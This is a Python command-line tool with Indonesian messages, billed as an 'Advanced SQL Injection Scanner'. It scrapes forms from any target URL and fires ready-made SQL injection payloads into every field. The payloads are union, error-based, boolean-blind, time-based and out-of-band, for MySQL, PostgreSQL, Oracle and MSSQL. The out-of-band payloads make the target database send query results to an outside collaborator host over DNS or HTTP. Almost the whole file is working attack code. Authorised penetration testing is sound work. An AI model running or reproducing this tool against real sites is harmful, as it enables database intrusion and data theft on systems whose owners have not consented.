#!/usr/bin/env python3
import os
import sys
import time
import argparse
import requests
import subprocess
import importlib.util
from urllib.parse import urljoin
from colorama import Fore, Style, init
from bs4 import BeautifulSoup

# Inisialisasi Colorama
init(autoreset=True)

# Konfigurasi
REQUIRED_PACKAGES = {
    'requests': 'requests',
    'beautifulsoup4': 'bs4',
    'colorama': 'colorama',
    'argparse': 'argparse'
}

class DependencyManager:
    @staticmethod
    def check_dependencies():
        missing = []
        for pkg_name, import_name in REQUIRED_PACKAGES.items():
            if not importlib.util.find_spec(import_name):
                missing.append(pkg_name)
        return missing

    @staticmethod
    def install_dependencies(missing):
        print(f"\n{Fore.YELLOW}[!] Memerlukan dependensi: {', '.join(missing)}")
        print(f"{Fore.CYAN}[+] Mencoba instalasi otomatis...{Style.RESET_ALL}")
        
        try:
            pip = 'pip3' if subprocess.run(['which', 'pip3'], stdout=subprocess.PIPE, stderr=subprocess.PIPE).returncode == 0 else 'pip'
            for pkg in missing:
                result = subprocess.run([pip, 'install', pkg], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                if result.returncode == 0:
                    print(f"{Fore.GREEN}[✓] {pkg} terinstal{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}[!] Gagal menginstal {pkg}: {result.stderr}{Style.RESET_ALL}")
                    return False
            return True
        except Exception as e:
            print(f"{Fore.RED}[!] Kesalahan sistem: {str(e)}{Style.RESET_ALL}")
            return False

class AdvancedSQLiScanner:
    def __init__(self, target):
        if not target.startswith(('http://', 'https://')):
            raise ValueError("URL harus dimulai dengan http:// atau https://")
        self.target = target
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        self.vulnerable = False
        self.db_type = None
        self.payloads = {
            'in_band': {
                'union': {
                    'mysql': "' UNION SELECT {cols}-- ",
                    'postgresql': "' UNION SELECT {cols}-- ",
                    'oracle': "' UNION SELECT {cols} FROM DUAL-- ",
                    'mssql': "' UNION SELECT {cols}-- "
                },
                'error': {
                    'mysql': "' AND EXTRACTVALUE(0, CONCAT(0x5c, (SELECT @@version))-- ",
                    'postgresql': "' AND CAST((SELECT version()) AS INTEGER)-- ",
                    'oracle': "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT USER FROM DUAL))-- ",
                    'mssql': "' AND 1=CONVERT(int, (SELECT @@version))-- "
                }
            },
            'inferential': {
                'boolean': {
                    'mysql': "' AND ASCII(SUBSTRING((SELECT @@version),1,1))>{guess}-- ",
                    'postgresql': "' AND ASCII(SUBSTRING((SELECT version()),1,1))>{guess}-- ",
                    'oracle': "' AND ASCII(SUBSTR((SELECT banner FROM v$version WHERE rownum=1),1,1))>{guess}-- ",
                    'mssql': "' AND ASCII(SUBSTRING((SELECT @@version),1,1))>{guess}-- "
                },
                'time': {
                    'mysql': "' AND IF(ASCII(SUBSTRING((SELECT USER()),1,1))>{guess}, SLEEP(5), 0)-- ",
                    'postgresql': "' AND CASE WHEN ASCII(SUBSTRING((SELECT current_user),1,1))>{guess} THEN pg_sleep(5) ELSE pg_sleep(0) END-- ",
                    'oracle': "' AND CASE WHEN ASCII(SUBSTR((SELECT user FROM dual),1,1))>{guess} THEN dbms_pipe.receive_message('a',5) ELSE 0 END-- ",
                    'mssql': "' IF ASCII(SUBSTRING((SELECT SYSTEM_USER),1,1))>{guess} WAITFOR DELAY '0:0:5'-- "
                }
            },
            'out_of_band': {
                'dns': {
                    'mysql': "' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT HEX({col})),'.{collaborator}/'))-- ",
                    'oracle': "' UNION SELECT UTL_HTTP.REQUEST('http://{collaborator}/'||(SELECT {col} FROM DUAL)) FROM DUAL-- ",
                    'mssql': "'; EXEC master..xp_dirtree '//{collaborator}/' + (SELECT {col})-- "
                }
            }
        }

    def scan_forms(self):
        try:
            response = self.session.get(self.target, timeout=15)
            response.raise_for_status()
            
            # Periksa apakah response adalah HTML
            if 'text/html' not in response.headers.get('Content-Type', ''):
                print(f"{Fore.YELLOW}[-] Response bukan HTML, skip form scanning{Style.RESET_ALL}")
                return []
                
            soup = BeautifulSoup(response.text, 'html.parser')
            return soup.find_all('form')
            
        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}Error saat mengambil halaman: {e}{Style.RESET_ALL}")
            return []
        except Exception as e:
            print(f"{Fore.RED}Error umum: {e}{Style.RESET_ALL}")
            return []

    def submit_form(self, form, payload):
        try:
            form_details = {}
            action = form.get('action')
            method = form.get('method', 'get').lower()
            url = urljoin(self.target, action)
            
            data = {}
            for input_tag in form.find_all('input'):
                input_name = input_tag.get('name')
                input_value = input_tag.get('value', '')
                if input_name:
                    data[input_name] = input_value + payload

            if method == 'post':
                response = self.session.post(url, data=data, timeout=20)
            else:
                response = self.session.get(url, params=data, timeout=20)
                
            return response
        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}Error koneksi: {e}{Style.RESET_ALL}")
            return None
        except Exception as e:
            print(f"{Fore.RED}Error saat submit form: {e}{Style.RESET_ALL}")
            return None

    def detect_database(self, response):
        error_messages = {
            'mysql': ["SQL syntax; MySQL", "Warning: mysql"],
            'postgresql': ["PostgreSQL", "PG::"],
            'oracle': ["ORA-", "Oracle error"],
            'mssql': ["Microsoft SQL Server", "ODBC Driver", "SQL Server"]
        }
        content = response.text if response else ""
        for db, errors in error_messages.items():
            for error in errors:
                if error in content:
                    return db
        return None

    def in_band_scan(self):
        print(f"\n{Fore.CYAN}[+] Memulai In-band SQL Injection Scan{Style.RESET_ALL}")
        forms = self.scan_forms()
        if not forms:
            print(f"{Fore.YELLOW}[-] Tidak ada form ditemukan{Style.RESET_ALL}")
            return
            
        for form in forms:
            print(f"{Fore.BLUE}[*] Menguji form: {form.get('action')}{Style.RESET_ALL}")
            
            # Union-based
            for db_type in ['mysql', 'postgresql', 'oracle', 'mssql']:
                payload = self.payloads['in_band']['union'][db_type].format(cols=','.join(['NULL']*5))
                response = self.submit_form(form, payload)
                if response and response.status_code == 200:
                    print(f"{Fore.GREEN}[!] Potensi Union-based SQLi pada {db_type}{Style.RESET_ALL}")
                    self.vulnerable = True
            
            # Error-based
            for db_type in ['mysql', 'postgresql', 'oracle', 'mssql']:
                payload = self.payloads['in_band']['error'][db_type]
                response = self.submit_form(form, payload)
                if response:
                    db = self.detect_database(response)
                    if db:
                        print(f"{Fore.GREEN}[!] Error-based SQLi terdeteksi. Database: {db}{Style.RESET_ALL}")
                        self.vulnerable = True
                        self.db_type = db

    def inferential_scan(self):
        print(f"\n{Fore.CYAN}[+] Memulai Inferential SQL Injection Scan{Style.RESET_ALL}")
        forms = self.scan_forms()
        if not forms:
            print(f"{Fore.YELLOW}[-] Tidak ada form ditemukan{Style.RESET_ALL}")
            return
            
        for form in forms:
            print(f"{Fore.BLUE}[*] Menguji form: {form.get('action')}{Style.RESET_ALL}")
            
            # Boolean-based
            for db_type in ['mysql', 'postgresql', 'oracle', 'mssql']:
                payload = self.payloads['inferential']['boolean'][db_type].format(guess='0')
                true_response = self.submit_form(form, payload)
                payload = payload.replace('>0', '>255')  # Payload yang pasti salah
                false_response = self.submit_form(form, payload)
                
                if true_response and false_response and true_response.text != false_response.text:
                    print(f"{Fore.GREEN}[!] Blind Boolean-based SQLi terdeteksi ({db_type}){Style.RESET_ALL}")
                    self.vulnerable = True
            
            # Time-based
            for db_type in ['mysql', 'postgresql', 'oracle', 'mssql']:
                start_time = time.time()
                payload = self.payloads['inferential']['time'][db_type].format(guess='0')
                self.submit_form(form, payload)
                response_time = time.time() - start_time
                
                if response_time > 5:
                    print(f"{Fore.GREEN}[!] Time-based SQLi terdeteksi ({db_type}){Style.RESET_ALL}")
                    self.vulnerable = True

    def out_of_band_scan(self, collaborator):
        print(f"\n{Fore.CYAN}[+] Memulai Out-of-band SQL Injection Scan{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Pastikan server collaborator aktif: {collaborator}{Style.RESET_ALL}")
        forms = self.scan_forms()
        if not forms:
            print(f"{Fore.YELLOW}[-] Tidak ada form ditemukan{Style.RESET_ALL}")
            return
            
        for form in forms:
            print(f"{Fore.BLUE}[*] Menguji form: {form.get('action')}{Style.RESET_ALL}")
            for db_type in ['mysql', 'oracle', 'mssql']:
                payload = self.payloads['out_of_band']['dns'][db_type].format(
                    col='@@version',
                    collaborator=collaborator
                )
                self.submit_form(form, payload)
                print(f"{Fore.YELLOW}[*] Payload untuk {db_type} dikirim. Periksa collaborator.{Style.RESET_ALL}")

    def full_scan(self, collaborator=None):
        self.in_band_scan()
        self.inferential_scan()
        if collaborator:
            self.out_of_band_scan(collaborator)
        
        if not self.vulnerable:
            print(f"{Fore.RED}[-] Tidak ditemukan kerentanan SQL Injection{Style.RESET_ALL}")

def main():
    parser = argparse.ArgumentParser(description='Lexsus Security Matrix - Advanced SQL Injection Scanner')
    parser.add_argument('target', help='URL target (contoh: http://example.com)')
    parser.add_argument('--in-band', action='store_true', help='Hanya lakukan in-band scan')
    parser.add_argument('--inferential', action='store_true', help='Hanya lakukan inferential scan')
    parser.add_argument('--out-of-band', metavar='COLLAB', help='Lakukan out-of-band scan dengan server collaborator')
    parser.add_argument('--full', action='store_true', help='Lakukan semua jenis scan (termasuk out-of-band jika server collaborator diberikan)')
    args = parser.parse_args()

    # Periksa dependensi
    missing = DependencyManager.check_dependencies()
    if missing:
        if not DependencyManager.install_dependencies(missing):
            sys.exit(1)
    
    try:
        scanner = AdvancedSQLiScanner(args.target)
        
        if args.in_band:
            scanner.in_band_scan()
        elif args.inferential:
            scanner.inferential_scan()
        elif args.out_of_band:
            scanner.out_of_band_scan(args.out_of_band)
        elif args.full:
            scanner.full_scan(args.out_of_band if args.out_of_band else None)
        else:
            # Mode default: lakukan full scan tanpa out-of-band
            scanner.full_scan()
            
    except ValueError as e:
        print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
        sys.exit(1)
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Scan dihentikan oleh pengguna{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"{Fore.RED}Error tidak terduga: {e}{Style.RESET_ALL}")
        sys.exit(1)

if __name__ == "__main__":
    if sys.version_info < (3, 6):
        print(f"{Fore.RED}Error: Python versi 3.6 atau lebih tinggi diperlukan{Style.RESET_ALL}")
        sys.exit(1)
    main()
